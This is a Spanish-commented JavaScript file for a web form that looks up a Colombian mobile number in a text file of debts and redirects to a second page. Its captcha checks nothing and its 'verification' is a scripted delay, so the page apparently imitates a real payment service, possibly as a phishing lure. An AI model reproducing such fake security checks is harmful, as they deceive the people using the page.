document.addEventListener("DOMContentLoaded", function () {
    const serviceItems = document.querySelectorAll('.servicio-item');
    const checkboxImages = document.querySelectorAll('.checkbox-img');
    const continuarBtn = document.getElementById('boton');
    const inputCelular = document.getElementById('celular');
    const loader = document.getElementById('loader');
    const captchaCheckbox = document.getElementById('checkbox');
    const captchaCl = document.getElementById('cl');
    const captchaClc = document.getElementById('clc');
    let isCaptchaChecked = false;

    // Lógica para seleccionar un solo servicio
    serviceItems.forEach(item => {
        item.addEventListener('click', () => {
            // Desmarcar todos los servicios
            serviceItems.forEach(i => {
                i.classList.remove('selected');
                const img = i.querySelector('.checkbox-img');
                img.src = 'img/uncheck.png';
            });

            // Marcar el servicio actual
            item.classList.add('selected');
            const checkbox = item.querySelector('.checkbox-img');
            checkbox.src = 'img/check.png';

            // Ocultar mensaje de error si se selecciona un servicio
            document.getElementById('msg-error-servicio').classList.add('hidden');
        });
    });

    // Lógica para el captcha
    if (captchaCheckbox) {
        captchaCheckbox.addEventListener('click', () => {
            captchaCheckbox.classList.add('hidden');
            if (captchaCl) captchaCl.classList.remove('hidden');

            setTimeout(() => {
                if (captchaCl) captchaCl.classList.add('hidden');
                if (captchaClc) captchaClc.classList.remove('hidden');
                isCaptchaChecked = true;
                document.getElementById('msg-error-captcha').classList.add('hidden');
            }, 1000);
        });
    }

    // Evento al hacer clic en el botón Continuar
    continuarBtn.addEventListener('click', () => {
        let isValid = true;

        // Validación del servicio
        const selectedService = document.querySelector('.servicio-item.selected');
        if (!selectedService) {
            document.getElementById('msg-error-servicio').classList.remove('hidden');
            isValid = false;
        } else {
            document.getElementById('msg-error-servicio').classList.add('hidden');
        }

        // Validación del número de celular
        const celularValue = inputCelular.value;
        if (celularValue.length !== 10) {
            document.getElementById('msg-error-celular').classList.remove('hidden');
            isValid = false;
        } else {
            document.getElementById('msg-error-celular').classList.add('hidden');
        }

        // Validación del captcha
        if (!isCaptchaChecked) {
            document.getElementById('msg-error-captcha').classList.remove('hidden');
            isValid = false;
        } else {
            document.getElementById('msg-error-captcha').classList.add('hidden');
        }

        if (isValid) {
            // Mostrar loader
            loader.classList.remove('hidden');

            // Simulación de la verificación de la deuda
            setTimeout(() => {
                fetch('deudas.txt')
                    .then(response => response.text())
                    .then(data => {
                        const deudas = data.split('\n');

                        // Añadimos el prefijo '57' al número del usuario antes de buscarlo
                        const numeroParaBuscar = `57${celularValue}`;
                        const deudaEncontrada = deudas.find(line => line.startsWith(numeroParaBuscar));

                        loader.classList.add('hidden');

                        if (deudaEncontrada) {
                            const [numero, deuda] = deudaEncontrada.split(':');
                            // Redireccionar a la segunda página con los parámetros de la URL
                            window.location.href = `index2.html?numero=${numero}&deuda=${deuda}`;
                        } else {
                            // Si el número no se encuentra, mostrar mensaje de error en la página
                            console.log('Número no encontrado en la base de datos.');
                            alert('Número de celular no encontrado o sin deudas pendientes.');
                        }
                    })
                    .catch(error => {
                        console.error('Error al leer el archivo de deudas:', error);
                        loader.classList.add('hidden');
                        alert('Ocurrió un error al verificar la información. Por favor, inténtalo de nuevo.');
                    });
            }, 2000); // Simula 2 segundos de espera para la verificación
        }
    });
});
